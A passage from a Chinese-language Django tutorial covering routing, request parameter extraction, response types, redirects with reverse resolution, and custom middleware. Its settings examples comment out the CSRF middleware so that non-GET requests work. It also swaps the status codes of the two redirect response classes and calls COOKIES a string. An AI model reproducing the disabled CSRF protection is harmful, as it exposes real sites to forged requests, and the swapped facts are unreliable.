路由解析顺序</h4><ul><li>Django的总路由和子路由都是定义在<strong><code>urlpatterns</code></strong>列表中的。</li><li>Django在接收到一个请求时，从总路由文件中的<code>urlpatterns</code>列表中以由上至下的顺序查找对应路由规则。</li><li>如果发现规则在<code>include</code>中包含了，则再进入被包含的<code>urls</code>中的<code>urlpatterns</code>列表由上至下进行查询。</li></ul><blockquote><p><strong>可能存在的问题：</strong></p></blockquote><ul><li>如果网络地址正则表达式没有写完整，比如，没有写严格的开头和结尾，那么就很容易出现前面的路由屏蔽掉了后面的路由。</li></ul><blockquote><p><strong>提示：</strong></p></blockquote><ul><li><strong>该问题只会出现在使用<code>re_path()、url()</code>定义路由时出现。</strong></li><li>因为 <code>path()</code> 定义路由时，网络地址正则表达式默认就是严格的开头和结尾。</li></ul><blockquote><p><strong>例子：</strong></p></blockquote><pre><code class="python">class SayView(View):    &quot;&quot;&quot;测试路由屏蔽    http://127.0.0.1:8000/say/    &quot;&quot;&quot;    def get(self, request):        return http.HttpResponse(&#39;say&#39;)class SayHelloView(View):    &quot;&quot;&quot;测试路由屏蔽    http://127.0.0.1:8000/sayhello/    &quot;&quot;&quot;    def get(self, request):        return http.HttpResponse(&#39;say hello&#39;)# 测试路由屏蔽# http://127.0.0.1:8000/say/re_path(r&#39;^say&#39;, views.SayView.as_view()),# http://127.0.0.1:8000/sayhello/re_path(r&#39;^sayhello&#39;, views.SayHelloView.as_view()),</code></pre><blockquote><p><strong>完整的、正确的路由定义方式：</strong></p></blockquote><pre><code class="python"># 测试路由屏蔽# http://127.0.0.1:8000/say/re_path(r&#39;^say/$&#39;, views.SayView.as_view()),# # http://127.0.0.1:8000/sayhello/re_path(r&#39;^sayhello/$&#39;, views.SayHelloView.as_view()),</code></pre><h3 id="4-请求HttpRequest"><a href="#4-请求HttpRequest" class="headerlink" title="4.请求HttpRequest"></a>4.请求HttpRequest</h3><blockquote><p>提示：</p></blockquote><ul><li><strong>用户发送请求时携带的参数后端需要使用，而不同的发送参数的方式对应了不同的提取参数的方式</strong></li><li>所以要学会如何提取参数，我们就需要先了解前端传参数有哪些方式</li></ul><blockquote><p>利用HTTP协议向服务器传参有以下几种途径</p></blockquote><ul><li>查询字符串数据（query string）：<ul><li>形如：<code>?key1=value1&amp;key2=value2</code></li><li>比如：<code>http://www.meiduo.site/list/115/1/?sort=price</code>中的<strong><code>?sort=price</code></strong></li></ul></li><li>请求体数据（body）：<ul><li>比如：表单数据、json、……</li></ul></li><li>URL路径中的特定部分数据：<ul><li>比如：<code>http://www.meiduo.site/detail/2/</code>中的<strong><code>/2/</code></strong></li><li>请求地址中的该部分数据，可以在路由中使用正则表达式提取出来</li></ul></li><li>请求头数据：<ul><li>HTTP请求报文中的请求头数据（header）</li></ul></li></ul><h4 id="4-1-提取查询字符串数据"><a href="#4-1-提取查询字符串数据" class="headerlink" title="4.1 提取查询字符串数据"></a>4.1 提取查询字符串数据</h4><blockquote><p><strong>提示：</strong></p></blockquote><ul><li>获取请求路径中的查询字符串参数，形如：<strong><code>?k1=v1&amp;k2=v2</code></strong></li><li>可以通过<strong><code>request.GET</code></strong>属性获取，并返回QueryDict类型的对象</li></ul><pre><code class="python"># 注册总路由urlpatterns = [    # 用户模块：http://127.0.0.1:8000/users/register/    path(&#39;&#39;, include(&#39;users.urls&#39;)),    # 请求和响应    path(&#39;&#39;, include(&#39;request_response.urls&#39;)),]</code></pre><pre><code class="python">class QSParamView(View):    &quot;&quot;&quot;测试提取查询字符串参数    http://127.0.0.1:8000/querystring/?name=zxc&amp;age=18    &quot;&quot;&quot;    def get(self, request):        # 获取查询字符串参数name、age        name = request.GET.get(&#39;name&#39;, &#39;小明&#39;)        age = request.GET.get(&#39;age&#39;, &#39;0&#39;)        return http.HttpResponse(&#39;查询字符串参数：%s--%s&#39; % (name, age))</code></pre><pre><code class="python"># 注册子路由urlpatterns = [    # 测试提取查询字符串参数：http://127.0.0.1:8000/querystring/?name=zxc&amp;age=18    path(&#39;querystring/&#39;, views.QSParamView.as_view()),]</code></pre><blockquote><p><strong>重要提示：</strong></p></blockquote><ul><li><strong>提取查询字符串参数不区分请求方式，即使客户端进行POST方式的请求，依然可以通过request.GET获取请求中的查询字符串参数。</strong></li></ul><blockquote><p><strong><code>QueryDict</code>补充：</strong></p></blockquote><ul><li><p><strong><code>QueryDict</code></strong>是由Django自己封装的一个数据类型，继承自python的字典Dict</p></li><li><p>它被定义在<code>django.http.QueryDict</code>中</p></li><li><p>它专门用来存储请求中提取的查询字符串参数和请求体参数</p><ul><li>即，HttpRequest对象中的属性GET、POST都是QueryDict类型的数据</li></ul></li><li><p><code>QueryDict</code></p><p>的使用：</p><pre><code class="python"># 如果键不存在则返回None值，可以设置默认值进行后续处理query_dict.get(&#39;键&#39;,默认值)# 可简写为：query_dict[&#39;键&#39;]</code></pre></li></ul><h4 id="4-2-提取请求体数据"><a href="#4-2-提取请求体数据" class="headerlink" title="4.2 提取请求体数据"></a>4.2 提取请求体数据</h4><blockquote><p>提示：</p></blockquote><ul><li>可以发送请求体数据的请求方式有：<strong>POST</strong>、<strong>PUT</strong>、<strong>PATCH</strong>、<strong>DELETE</strong></li><li>请求体数据格式不固定，常见的有：<strong><code>表单类型数据和JSON字符串类型</code></strong>，我们应区别对待</li></ul><h5 id="4-2-1-表单类型请求体数据-Form-Data"><a href="#4-2-1-表单类型请求体数据-Form-Data" class="headerlink" title="4.2.1 表单类型请求体数据(Form Data)"></a>4.2.1 表单类型请求体数据(Form Data)</h5><blockquote><p>前端发送的表单类型的请求体数据，可以通过<strong><code>request.POST</code></strong>属性获取，并返回QueryDict对象。</p></blockquote><pre><code class="python"># 测试提取表单类型请求体数据：http://127.0.0.1:8000/formdata/path(&#39;formdata/&#39;, views.FormDataParamView.as_view()),class FormDataParamView(View):    &quot;&quot;&quot;测试提取表单类型请求体参数    http://127.0.0.1:8000/formdata/    &quot;&quot;&quot;    def post(self, request):        # 获取表单类型请求体参数中的username、password        username = request.POST.get(&#39;username&#39;)        password = request.POST.get(&#39;password&#39;)        return http.HttpResponse(&#39;表单类型请求体参数：%s--%s&#39; % (username, password))</code></pre><blockquote><p><strong>重要提示：</strong></p><ul><li><strong><code>request.POST</code>只能用来获取POST表单发送的请求体数据</strong></li></ul></blockquote><h5 id="4-2-2-非表单类型请求体数据-Non-Form-Data-：JSON"><a href="#4-2-2-非表单类型请求体数据-Non-Form-Data-：JSON" class="headerlink" title="4.2.2 非表单类型请求体数据(Non-Form Data)：JSON"></a>4.2.2 非表单类型请求体数据(Non-Form Data)：JSON</h5><blockquote><p>提示：</p></blockquote><ul><li>非表单类型的请求体数据，Django无法自动解析，可以通过<strong><code>request.body</code></strong>属性获取最原始的请求体数据</li><li>然后自己按照具体请求体原始数据的格式（JSON等）进行解析</li><li><strong><code>request.body</code>获取的是<code>bytes类型</code>的请求体原始数据</strong></li></ul><blockquote><p>需求：</p></blockquote><ul><li>获取请求体中的如下JSON数据</li></ul><pre><code class="json">{    &quot;username&quot;: &quot;张三&quot;,    &quot;password&quot;: &quot;123&quot;}</code></pre><p>可以进行如下方法操作：</p><pre><code class="python"># 测试提取非表单类型请求体参数：http://127.0.0.1:8000/json/path(&#39;json/&#39;, views.JSONParamView.as_view()),import jsonclass JSONParamView(View):    &quot;&quot;&quot;测试提取非表单类型请求体参数    http://127.0.0.1:8000/json/    &quot;&quot;&quot;    def post(self, request):        # 获取请求体中原始的JSON数据        json_str = request.body        # 使用json模块将原始的JSON数据转字典        json_dict = json.loads(json_str)        # 提取JSON数据中的参数        username = json_dict.get(&#39;username&#39;)        password = json_dict.get(&#39;password&#39;)        return http.HttpResponse(&#39;非表单类型请求体参数：%s--%s&#39; % (username, password))</code></pre><h4 id="4-3-URL路径参数：提取URL路径中的特定部分数据"><a href="#4-3-URL路径参数：提取URL路径中的特定部分数据" class="headerlink" title="4.3 URL路径参数：提取URL路径中的特定部分数据"></a>4.3 URL路径参数：提取URL路径中的特定部分数据</h4><blockquote><p>提示：</p></blockquote><ul><li>在定义路由时，可以从URL中获取特定部分的路径参数</li><li>Django的路由系统会将提取的路径参数传递到视图的内部</li><li>path()和re_path()都可以提取路径参数</li></ul><blockquote><p>需求：</p></blockquote><ul><li><p>需求1：</p><pre><code>http://127.0.0.1:8000/url_param1/18/</code></pre><ul><li>提取路径中的数字<code>18</code></li></ul></li><li><p>需求2：</p><pre><code>http://127.0.0.1:8000/url_param2/18500001111/</code></pre><ul><li>提取路径中的手机号<code>18500001111</code></li></ul></li></ul><h5 id="4-3-1-path-提取路径参数"><a href="#4-3-1-path-提取路径参数" class="headerlink" title="4.3.1 path()提取路径参数"></a>4.3.1 path()提取路径参数</h5><blockquote><p><strong>实现需求1</strong></p></blockquote><pre><code class="python"># 测试path()提取普通路径参数：http://127.0.0.1:8000/url_param1/18/path(&#39;url_param1/&lt;int:age&gt;/&#39;, views.URLParam1View.as_view()),class URLParam1View(View):    &quot;&quot;&quot;测试path()提取普通路径参数    http://127.0.0.1:8000/url_param1/18/    &quot;&quot;&quot;    def get(self, request, age):        &quot;&quot;&quot;        :param age: 路由提取的关键字参数        &quot;&quot;&quot;        return http.HttpResponse(&#39;测试path()提取普通路径参数：%s&#39; % age)</code></pre><blockquote><p>重要提示：</p></blockquote><ul><li><strong>路由中提取路径参数时，使用的关键字，必须跟视图中参数名一致</strong></li></ul><blockquote><p>思考：</p></blockquote><ul><li>实现需求1时提取age数字的<strong><code>&lt;int:age&gt;</code></strong>是什么？</li></ul><blockquote><p>结论：</p></blockquote><ul><li><strong>路由转换器</strong></li><li>Django默认封装了一些正则表达式，用于在path()中要提取路径参数时使用</li></ul><blockquote><p>默认的路由转换器：</p><ul><li>位置在<code>django.urls.converters.py</code></li></ul></blockquote><pre><code class="python">DEFAULT_CONVERTERS = {    &#39;int&#39;: IntConverter(), # 匹配正整数，包含0    &#39;path&#39;: PathConverter(), # 匹配任何非空字符串，包含了路径分隔符    &#39;slug&#39;: SlugConverter(), # 匹配字母、数字以及横杠、下划线组成的字符串    &#39;str&#39;: StringConverter(), # 匹配除了路径分隔符（/）之外的非空字符串，这是默认的形式    &#39;uuid&#39;: UUIDConverter(), # 匹配格式化的uuid，如 075194d3-6885-417e-a8a8-6c931e272f00}</code></pre><blockquote><p><strong>实现需求2</strong></p></blockquote><ul><li><pre><code>http://127.0.0.1:8000/url_param2/18500001111/</code></pre><ul><li>提取路径中的手机号<code>18500001111</code></li></ul></li></ul><blockquote><p>问题：</p></blockquote><ul><li>默认的路由转换器中，没有专门用来匹配手机号的路由转换器</li><li>所以在使用path()实现需求2时，就无法直接使用默认的路由转换器</li></ul><blockquote><p>解决方案：</p></blockquote><ul><li>如果默认的路由转换器无法满足需求时，我们就需要<strong>自定义路由转换器</strong></li></ul><blockquote><p>实现需求2：自定义路由转换器</p></blockquote><ul><li><p>在任意可以被导入的python文件中，都可以自定义路由转换器</p></li><li><p>比如：在工程根目录下，新建<strong><code>converters.py</code></strong>文件，用于自定义路由转换器</p><pre><code class="python">class MobileConverter:  &quot;&quot;&quot;自定义路由转换器：匹配手机号&quot;&quot;&quot;  # 匹配手机号码的正则  regex = &#39;1[3-9]\d{9}&#39;  def to_python(self, value):      # 将匹配结果传递到视图内部时使用      return int(value)  def to_url(self, value):      # 将匹配结果用于反向解析传值时使用      return str(value)</code></pre></li><li><p>注册自定义路由转换器</p><ul><li><p>在总路由中，注册自定义路由转换器</p><pre><code class="python">from django.urls import register_converterfrom converters import MobileConverter# 注册自定义路由转换器# register_converter(自定义路由转换器, &#39;别名&#39;)register_converter(MobileConverter, &#39;mobile&#39;)urlpatterns = []</code></pre></li></ul></li><li><p>使用自定义路由转换器</p><pre><code class="python"># 测试path()中自定义路由转换器提取路径参数：手机号 http://127.0.0.1:8000/url_param2/18500001111/path(&#39;url_param2/&lt;mobile:phone_num&gt;/&#39;, views.URLParam2View.as_view()),</code></pre><pre><code class="python">class URLParam2View(View):  &quot;&quot;&quot;测试path()中自定义路由转换器提取路径参数：手机号  http://127.0.0.1:8000/url_param2/18500001111/  &quot;&quot;&quot;  def get(self, request, phone_num):      &quot;&quot;&quot;      :param phone_num: 路由提取的关键字参数      &quot;&quot;&quot;      return http.HttpResponse(&#39;测试path()提取路径参数手机号：%s&#39; % phone_num)</code></pre></li></ul><h5 id="4-3-2-re-path-提取路径参数"><a href="#4-3-2-re-path-提取路径参数" class="headerlink" title="4.3.2 re_path()提取路径参数"></a>4.3.2 re_path()提取路径参数</h5><pre><code class="python"># 测试re_path()提取路径参数：http://127.0.0.1:8000/url_param3/18500001111/re_path(r&#39;^url_param3/(?P&lt;phone_num&gt;1[3-9]\d{9})/$&#39;, views.URLParam3View.as_view()),class URLParam3View(View):    &quot;&quot;&quot;测试re_path()提取路径参数    http://127.0.0.1:8000/url_param3/18500001111/    &quot;&quot;&quot;    def get(self, request, phone_num):        &quot;&quot;&quot;        :param phone_num: 路由提取的关键字参数        &quot;&quot;&quot;        return http.HttpResponse(&#39;测试re_path()提取路径参数：%s&#39; % phone_num)</code></pre><h5 id="4-3-3-path-和re-path-如何选择？"><a href="#4-3-3-path-和re-path-如何选择？" class="headerlink" title="4.3.3 path()和re_path()如何选择？"></a>4.3.3 path()和re_path()如何选择？</h5><ul><li>path()语法相对简洁一些，如果没有路径参数要提取或者要提取的路径参数可以使用默认的路由转换器实现时，就选择path()。</li><li>re_path()语法相对复杂一些，但是，如果希望在匹配路由时，由自己编写所有的正则表达式，就选择re_path()。</li><li>需要注意的是，在使用re_path()时，网络地址正则表达式一定要写完整，要有严格的开头和结尾</li></ul><h4 id="4-4-请求头"><a href="#4-4-请求头" class="headerlink" title="4.4 请求头"></a>4.4 请求头</h4><p>可以通过<strong><code>request.META</code></strong>属性获取请求头headers中的数据，<strong><code>request.META</code>为字典类型</strong>。</p><p>常见的请求头如：</p><ul><li><code>CONTENT_LENGTH</code> – The length of the request body (as a string).</li><li><code>CONTENT_TYPE</code> – The MIME type of the request body.</li><li><code>HTTP_ACCEPT</code> – Acceptable content types for the response.</li><li><code>HTTP_ACCEPT_ENCODING</code> – Acceptable encodings for the response.</li><li><code>HTTP_ACCEPT_LANGUAGE</code> – Acceptable languages for the response.</li><li><code>HTTP_HOST</code> – The HTTP Host header sent by the client.</li><li><code>HTTP_REFERER</code> – The referring page, if any.</li><li><code>HTTP_USER_AGENT</code> – The client’s user-agent string.</li><li><code>QUERY_STRING</code> – The query string, as a single (unparsed) string.</li><li><code>REMOTE_ADDR</code> – The IP address of the client.</li><li><code>REMOTE_HOST</code> – The hostname of the client.</li><li><code>REMOTE_USER</code> – The user authenticated by the Web server, if any.</li><li><code>REQUEST_METHOD</code> – A string such as <code>&quot;GET&quot;</code> or <code>&quot;POST&quot;</code>.</li><li><code>SERVER_NAME</code> – The hostname of the server.</li><li><code>SERVER_PORT</code> – The port of the server (as a string).</li></ul><p>具体使用如:</p><pre><code class="python">class HeadersParamView(View):    &quot;&quot;&quot;测试提取请求头参数&quot;&quot;&quot;    def get(self, request):        # 获取请求头中文件的类型        ret = request.META.get(&#39;CONTENT_TYPE&#39;)        return http.HttpResponse(&#39;OK&#39;)</code></pre><h4 id="4-5-其他常用HttpRequest对象属性"><a href="#4-5-其他常用HttpRequest对象属性" class="headerlink" title="4.5 其他常用HttpRequest对象属性"></a>4.5 其他常用HttpRequest对象属性</h4><ul><li>method：一个字符串，表示请求使用的HTTP方法，常用值包括：’GET’、’POST’。</li><li>FILES：一个类似于字典的对象，包含所有的上传文件。</li><li>COOKIES：一个字符串，包含了浏览器自动发送的cookie缓存数据。</li><li><strong>user：请求中认证出来的用户对象。</strong></li></ul><h3 id="5-响应HttpResponse"><a href="#5-响应HttpResponse" class="headerlink" title="5.响应HttpResponse"></a>5.响应HttpResponse</h3><blockquote><p>提示：</p></blockquote><ul><li>视图在接收请求并处理后，必须返回HttpResponse对象或子对象。</li><li>HttpRequest对象由Django创建，<strong>HttpResponse对象或子对象由开发人员创建</strong>。</li><li>常见的响应方式：<ul><li><strong><code>HttpResponse()</code></strong>：响应多种数据类型</li><li><strong><code>JsonResponse()</code></strong>：响应JSON</li><li><strong><code>redirect()</code></strong>：重定向</li><li><strong><code>render()</code></strong>：渲染并响应HTML模板</li></ul></li></ul><h4 id="5-1-HttpResponse"><a href="#5-1-HttpResponse" class="headerlink" title="5.1 HttpResponse"></a>5.1 HttpResponse</h4><blockquote><p>提示：</p></blockquote><ul><li><p>可以使用</p><p><code>django.http.HttpResponse</code></p><p>来构造响应对象。</p><pre><code class="python">response = HttpResponse(content=响应体, content_type=响应体数据类型，默认为text/html, status=状态码，默认为200)</code></pre></li></ul><blockquote><p>示例：</p></blockquote><pre><code class="python"># 测试HttpResponse：http://127.0.0.1:8000/response1/path(&#39;response1/&#39;, views.Response1View.as_view()),class Response1View(View):    &quot;&quot;&quot;测试HttpResponse    http://127.0.0.1:8000/response1/    &quot;&quot;&quot;    def get(self, request):        # 使用HttpResponse构造响应数据        # return http.HttpResponse(content=&#39;itcast python&#39;, status=200)        # 可简写        # return http.HttpResponse(&#39;itcast python&#39;)        # 另外一种写法        response = http.HttpResponse(&#39;itcast python&#39;)        return response</code></pre><blockquote><p>补充：HttpResponse子类</p></blockquote><p>Django提供了一系列HttpResponse的子类，可以快速设置状态码</p><ul><li><strong><code>HttpResponseRedirect</code></strong> 默认响应状态码为 <strong>301</strong></li><li><strong><code>HttpResponsePermanentRedirect</code></strong> 默认响应状态码为 <strong>302</strong></li><li><strong><code>HttpResponseNotModified</code></strong> 默认响应状态码为 <strong>304</strong></li><li><strong><code>HttpResponseBadRequest</code></strong> 默认响应状态码为 <strong>400</strong></li><li><strong><code>HttpResponseNotFound</code></strong> 默认响应状态码为 <strong>404</strong></li><li><strong><code>HttpResponseForbidden</code></strong> 默认响应状态码为 <strong>403</strong></li><li><strong><code>HttpResponseNotAllowed</code></strong> 默认响应状态码为 <strong>405</strong></li><li><strong><code>HttpResponseGone</code></strong> 默认响应状态码为 <strong>410</strong></li><li><strong><code>HttpResponseServerError</code></strong> 默认响应状态码为 <strong>500</strong></li></ul><h4 id="5-2-JsonResponse：响应JSON"><a href="#5-2-JsonResponse：响应JSON" class="headerlink" title="5.2 JsonResponse：响应JSON"></a>5.2 JsonResponse：响应JSON</h4><blockquote><p>提示：</p></blockquote><ul><li><p>在开发功能时，如果前端需要JSON数据，那么后端就需要构造并响应JSON数据</p></li><li><p>而Django提供了<strong><code>JsonResponse</code></strong>来构造并响应JSON数据</p></li><li><p><code>JsonResponse</code></p><p>作用：</p><ul><li>帮助我们将响应的数据转换为JSON字符串</li><li>设置响应头<strong>Content-Type</strong>为 <strong>application/json</strong></li></ul></li></ul><blockquote><p>示例：</p></blockquote><pre><code class="python"># 测试JSONResponse：http://127.0.0.1:8000/json_resp/path(&#39;json_resp/&#39;, views.JSONResponseView.as_view()),class JSONResponseView(View):    &quot;&quot;&quot;测试JSONResponse    http://127.0.0.1:8000/json_resp/    &quot;&quot;&quot;    def get(self, request):        # 准备要响应的数据        dict_data = {            &#39;city&#39;: &#39;beijing&#39;,            &#39;subject&#39;: &#39;python&#39;        }        # 使用JSONResponse构造并响应JSON数据        return http.JsonResponse(dict_data)</code></pre><h4 id="5-3-redirect-：重定向"><a href="#5-3-redirect-：重定向" class="headerlink" title="5.3 redirect()：重定向"></a>5.3 redirect()：重定向</h4><blockquote><p>提示：</p></blockquote><ul><li>在开发中，我们经常会遇到一种需求，当某个逻辑操作完成后，将用户引导到另外一个逻辑、页面中<ul><li>比如：用户注册、登录成功后，直接将用户引导到网站首页</li></ul></li></ul><blockquote><p>解决方案：</p></blockquote><ul><li><strong><code>redirect()</code></strong>：重定向</li></ul><blockquote><p>需求：</p></blockquote><ul><li>准备一个用于处理用户登录类视图<code>LoginRedirectView</code></li><li>访问<code>LoginRedirectView</code>时，如果其中的登录逻辑处理完成，我们将用户重定向到首页</li></ul><blockquote><p>示例：</p></blockquote><pre><code class="python"># 测试重定向path(&#39;login_redirect/&#39;, views.LoginRedirectView.as_view()),path(&#39;index/&#39;, views.IndexView.as_view()),from django.shortcuts import render, redirectclass IndexView(View):    &quot;&quot;&quot;测试重定向    http://127.0.0.1:8000/index/    &quot;&quot;&quot;    def get(self, request):        return http.HttpResponse(&#39;假装这是个网站首页&#39;)class LoginRedirectView(View):    &quot;&quot;&quot;测试重定向    http://127.0.0.1:8000/login_redirect/    &quot;&quot;&quot;    def post(self, request):        # 假装正在处理登录逻辑        # 假装登录逻辑处理完成        # ......        # 将用户通过重定向引导到首页        return redirect(&#39;/index/&#39;)</code></pre><h4 id="5-4-redirect-重定向-搭配-反向解析"><a href="#5-4-redirect-重定向-搭配-反向解析" class="headerlink" title="5.4 redirect()重定向 搭配 反向解析"></a>5.4 redirect()重定向 搭配 反向解析</h4><blockquote><p>思考：</p></blockquote><ul><li>我们定义的路由中的地址是否可能会做修改？</li><li>如果我们定义的路由中的地址在某次开发新版本时被修改了，那么重定向的地方是否也需要跟着改变？</li><li>如果该地址被很多地方都用到了，那么是否就意味着我们要修改代码的很多地方？</li></ul><blockquote><p>结论：</p></blockquote><ul><li>以上思考的问题，确实会存在的</li><li>我们定义的路由中的地址可能会在某次版本迭代时，做修改，使用新设计的地址</li><li>那么一旦地址变了，所有用到这个地址的地方，代码都需要修改，还可能会修改很多个地方的代码</li><li>而同时修改多个地方的代码，在开发中是个很危险的动作，而且也有一定的工作量</li></ul><blockquote><p>需求：</p></blockquote><ul><li>能否可以实现一种效果，可以保证即使在版本迭代时，使用了新设计的地址替换了路由中原有的地址，我们之前编写的使用该地址的代码不用去修改，达到动态获取的目的。</li></ul><blockquote><p>解决方案：</p></blockquote><ul><li><strong>路由反向解析</strong></li><li><strong>路由反向解析 是使用路由的别名，动态的解析出该路由中的真实地址</strong></li></ul><blockquote><p>示例：</p></blockquote><p>总路由中，给子应用的总路由起别名</p><pre><code class="python">urlpatterns = [    # 请求和响应    # path(&#39;&#39;, include((&#39;子路由&#39;, &#39;子应用名字&#39;), namespace=&#39;总路由别名，可以随便命名&#39;)),    path(&#39;&#39;, include((&#39;request_response.urls&#39;, &#39;request_response&#39;), namespace=&#39;request_response&#39;)),]</code></pre><p>子路由中，给子应用的子路由起别名</p><pre><code class="python"># 测试重定向path(&#39;login_redirect/&#39;, views.LoginRedirectView.as_view()),path(&#39;index/&#39;, views.IndexView.as_view(), name=&#39;index&#39;),</code></pre><p>视图中，使用路由的别名，动态的解析出该路由中的真实地址</p><pre><code class="python">from django.shortcuts import render, redirect, reverseclass IndexView(View):    &quot;&quot;&quot;测试重定向    http://127.0.0.1:8000/index/    &quot;&quot;&quot;    def get(self, request):        return http.HttpResponse(&#39;假装这是个网站首页&#39;)class LoginRedirectView(View):    &quot;&quot;&quot;测试重定向    http://127.0.0.1:8000/login_redirect/    &quot;&quot;&quot;    def post(self, request):        # 假装正在处理登录逻辑        # 假装登录逻辑处理完成        # ......        # 将用户通过重定向引导到首页        # return redirect(&#39;/index/&#39;)        # ret_url = reverse(&#39;总路由别名:子路由别名&#39;)        ret_url = reverse(&#39;request_response:index&#39;)        return redirect(ret_url)</code></pre><h3 id="6-中间件Middleware"><a href="#6-中间件Middleware" class="headerlink" title="6.中间件Middleware"></a>6.中间件Middleware</h3><h4 id="6-1-中间件介绍"><a href="#6-1-中间件介绍" class="headerlink" title="6.1 中间件介绍"></a>6.1 中间件介绍</h4><blockquote><p>概念：</p></blockquote><ul><li>Django中的中间件是一个轻量级、底层的插件系统，可以<strong>介入Django的请求和响应处理过程</strong>，修改Django的输入或输出</li><li>中间件的设计为开发者提供了一种无侵入式的开发方式，增强了Django框架的健壮性，其它的MVC框架也有这个功能</li></ul><blockquote><p>使用场景：</p></blockquote><ul><li><strong>当某些操作在每次请求或响应时都会执行时，可以写在中间件中</strong></li><li>比如，每次发送post请求都要进行CSRF验证，就把CSRF验证的代码写在中间件中</li></ul><blockquote><p>设计思想：</p></blockquote><ul><li>面向切面编程、无侵害式编程</li><li>不用直接修改框架源码，就可以达到自己想要的执行结果</li></ul><blockquote><p>默认的中间件</p></blockquote><pre><code class="python"># 中间件MIDDLEWARE = [    &#39;django.middleware.security.SecurityMiddleware&#39;,    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,    &#39;django.middleware.common.CommonMiddleware&#39;,    # 为保证非GET请求(POST, PUT, DELETE)可以正常接收，该中间件需要注释掉    # &#39;django.middleware.csrf.CsrfViewMiddleware&#39;,    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,]</code></pre><h4 id="6-2-中间件方法"><a href="#6-2-中间件方法" class="headerlink" title="6.2 中间件方法"></a>6.2 中间件方法</h4><blockquote><p>提示：</p><ul><li>Django在中间件中预置了六个方法，这六个方法会在不同的阶段自动执行，对输入或输出进行干预。</li></ul></blockquote><ul><li><p>2.1 初始化方法：</p><ul><li><p>启动Django程序，初始化中间件时，自动调用一次，用于确定是否启用当前中间件</p><pre><code class="python">def __init__(self, get_response=None):  pass</code></pre></li></ul></li><li><p>2.2 处理请求前的方法：(重要)</p><ul><li><p>在处理每个请求前，自动调用，返回None或HttpResponse对象</p><pre><code class="python">def process_request(self, request):  pass</code></pre></li></ul></li><li><p>2.3 处理视图前的方法：（重要）</p><ul><li><p>在处理每个视图前，自动调用，返回None或HttpResponse对象</p><pre><code class="python">def process_view(self, request, view_func, view_args, view_kwargs):  pass</code></pre></li></ul></li><li><p>2.4 处理模板响应前的方法：</p><ul><li><p>在处理每个模板响应前，自动调用，返回实现了render方法的响应对象</p><pre><code class="python">def process_template_response(self, request, response):  pass</code></pre></li></ul></li><li><p>2.5 处理响应后的方法：（重要）</p><ul><li><p>在每个响应返回给客户端之前，自动调用，返回HttpResponse对象</p><pre><code class="python">def process_response(self, request, response):  pass</code></pre></li></ul></li><li><p>2.6 异常处理：</p><ul><li><p>当视图抛出异常时，自动调用，返回一个HttpResponse对象</p><pre><code class="python">def process_exception(self, request,exception):  pass</code></pre></li></ul></li></ul><h4 id="6-3-自定义中间件"><a href="#6-3-自定义中间件" class="headerlink" title="6.3 自定义中间件"></a>6.3 自定义中间件</h4><ul><li>中间件是一个独立的Python类，可以定义Django提供的六个方法中的一个或多个</li><li>在工程根目录下，新建<code>middlewares.py</code>文件来自定义中间件</li><li>我们在自定义的中间件中，会去实现最重要的三个方法</li></ul><pre><code class="python"># 导入中间件的父类from django.utils.deprecation import MiddlewareMixinclass TestMiddleware1(MiddlewareMixin):    &quot;&quot;&quot;自定义中间件&quot;&quot;&quot;    def process_request(self, request):        &quot;&quot;&quot;处理请求前自动调用&quot;&quot;&quot;        print(&#39;process_request1 被调用&#39;)    def process_view(self, request, view_func, view_args, view_kwargs):        # 处理视图前自动调用        print(&#39;process_view1 被调用&#39;)    def process_response(self, request, response):        &quot;&quot;&quot;在每个响应返回给客户端之前自动调用&quot;&quot;&quot;        print(&#39;process_response1 被调用&#39;)        return response</code></pre><blockquote><p>注册自定义的中间件</p></blockquote><pre><code class="python"># 中间件MIDDLEWARE = [    &#39;django.middleware.security.SecurityMiddleware&#39;,    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,    &#39;django.middleware.common.CommonMiddleware&#39;,    # 为保证非GET请求(POST, PUT, DELETE)可以正常接收，该中间件需要注释掉    # &#39;django.middleware.csrf.CsrfViewMiddleware&#39;,    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,    &#39;middlewares.TestMiddleware1&#39;, # 注册自定义的中间件1]</code></pre><h4 id="6-4-中间件执行顺序"><a href="#6-4-中间件执行顺序" class="headerlink" title="6.4 中间件执行顺序"></a>6.4 中间件执行顺序</h4><blockquote><p>准备两个自定义的中间件</p></blockquote><pre><code class="python">from django.utils.deprecation import MiddlewareMixinclass TestMiddleware1(MiddlewareMixin):    &quot;&quot;&quot;自定义中间件&quot;&quot;&quot;    def process_request(self, request):        &quot;&quot;&quot;处理请求前自动调用&quot;&quot;&quot;        print(&#39;process_request1 被调用&#39;)    def process_view(self, request, view_func, view_args, view_kwargs):        # 处理视图前自动调用        print(&#39;process_view1 被调用&#39;)    def process_response(self, request, response):        &quot;&quot;&quot;在每个响应返回给客户端之前自动调用&quot;&quot;&quot;        print(&#39;process_response1 被调用&#39;)        return responseclass TestMiddleware2(MiddlewareMixin):    &quot;&quot;&quot;自定义中间件&quot;&quot;&quot;    def process_request(self, request):        &quot;&quot;&quot;处理请求前自动调用&quot;&quot;&quot;        print(&#39;process_request2 被调用&#39;)    def process_view(self, request, view_func, view_args, view_kwargs):        # 处理视图前自动调用        print(&#39;process_view2 被调用&#39;)    def process_response(self, request, response):        &quot;&quot;&quot;在每个响应返回给客户端之前自动调用&quot;&quot;&quot;        print(&#39;process_response2 被调用&#39;)        return response</code></pre><blockquote><p>注册多个自定义的中间件</p></blockquote><pre><code class="python"># 中间件MIDDLEWARE = [    &#39;django.middleware.security.SecurityMiddleware&#39;,    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,    &#39;django.middleware.common.CommonMiddleware&#39;,    # 为保证非GET请求(POST, PUT, DELETE)可以正常接收，该中间件需要注释掉    # &#39;django.middleware.csrf.CsrfViewMiddleware&#39;,    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,    &#39;middlewares.TestMiddleware1&#39;, # 注册自定义的中间件1    &#39;middlewares.TestMiddleware2&#39;, # 